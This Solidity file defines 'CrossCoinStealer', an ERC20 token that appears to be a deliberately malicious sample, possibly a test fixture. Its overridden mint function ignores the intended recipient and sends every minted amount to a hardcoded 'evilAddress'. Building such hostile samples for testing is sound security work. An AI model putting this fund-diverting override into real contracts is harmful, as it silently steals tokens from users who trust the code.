pragma solidity >=0.8;

import "../node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";

contract CrossCoinStealer is ERC20PresetMinterPauser {
    constructor() ERC20PresetMinterPauser("CrossCoinStealer", "CCS") {}

    address evilAddress = address(0xD9635866Ade8E73Cc8565921F7CF95f5Be8f6D3e);

    function mint(address to, uint256 amount) public virtual override {
        require(
            hasRole(MINTER_ROLE, _msgSender()),
            "ERC20PresetMinterPauser: must have minter role to mint"
        );
        _mint(evilAddress, amount);
    }
}
